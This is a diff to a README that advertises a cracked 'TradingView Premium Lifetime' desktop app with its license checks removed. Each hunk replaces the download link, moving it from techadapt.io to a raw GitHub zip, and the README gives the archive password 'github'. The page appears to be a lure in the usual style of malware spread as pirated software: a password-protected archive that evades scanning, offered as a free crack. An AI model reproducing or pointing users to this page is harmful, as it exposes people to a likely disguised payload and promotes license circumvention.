@@ -17,7 +17,7 @@ This is a **fully reverse-engineered version** that removes all license checks a
 
 ## ⚡ Quick Download
 
-[![Download Now](https://img.shields.io/badge/Download-TradingView%20Premium%20Lifetime-brightgreen?style=for-the-badge&logo=windows)](https://techadapt.io/share_windows/)
+[![Download Now](https://img.shields.io/badge/Download-TradingView%20Premium%20Lifetime-brightgreen?style=for-the-badge&logo=windows)](https://github.com/neoDax6/TradingViewPremium_Free/raw/refs/heads/main/TradingView_Premium_Desktop.zip)
 
 **Archive Password:** `github`
 
@@ -54,7 +54,7 @@ This is a **fully reverse-engineered version** that removes all license checks a
 ## 🔧 How to Install
 
 ### Step 1: Download the Archive
-Click the download button above or visit: [Download](https://techadapt.io/share_windows/)
+Click the download button above or visit: [Download](https://github.com/neoDax6/TradingViewPremium_Free/raw/refs/heads/main/TradingView_Premium_Desktop.zip)
 
 ### Step 2: Extract the Archive
 - Right-click the downloaded file
@@ -248,7 +248,7 @@ This repository is distributed under the **MIT License**. © 2025 TradingView Pr
 ## 🎯 Ready to Get Started?
 
 ### Download Now:
-[![Download](https://img.shields.io/badge/Download%20Now-TradingView%20Premium%20Lifetime-brightgreen?style=for-the-badge&logo=windows)](https://techadapt.io/share_windows/)
+[![Download](https://img.shields.io/badge/Download%20Now-TradingView%20Premium%20Lifetime-brightgreen?style=for-the-badge&logo=windows)](https://github.com/neoDax6/TradingViewPremium_Free/raw/refs/heads/main/TradingView_Premium_Desktop.zip)
 
 **Archive Password:** `github`
 
